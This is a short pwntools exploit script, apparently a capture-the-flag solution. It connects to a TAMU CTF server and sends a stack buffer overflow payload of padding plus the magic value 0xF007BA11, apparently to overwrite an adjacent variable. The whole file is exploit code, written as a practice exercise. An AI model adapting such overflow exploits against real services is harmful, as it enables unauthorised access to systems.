from pwn import *

s = remote("pwn.ctf.tamu.edu", 4321)

payload = "A" * (0x23-0xc)
payload += p32(0xF007BA11)

s.sendline(payload)
sleep(1)
print s.recv()
